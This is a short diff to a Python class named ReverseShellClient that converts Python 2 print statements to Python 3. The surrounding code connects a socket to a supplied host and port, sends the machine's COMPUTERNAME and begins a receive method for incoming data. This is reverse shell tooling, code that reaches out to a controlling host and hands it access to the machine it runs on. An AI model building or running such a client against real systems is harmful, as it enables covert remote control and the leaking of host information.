@@ -13,12 +13,12 @@ class ReverseShellClient:
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         port = int(port)
         try:
-            print '[!] trying to connect to %s:%s' % (host, port)
+            print('[!] trying to connect to %s:%s' % (host, port))
             self.s.connect((host, port))
-            print '[*] connection established'
+            print('[*] connection established')
             self.s.send(os.environ['COMPUTERNAME'])
         except:
-            print >> sys.stderr, 'could not connect'
+            print('could not connect', file=sys.stderr)
 
     def receive(self):
         received = self.s.recv(1024)
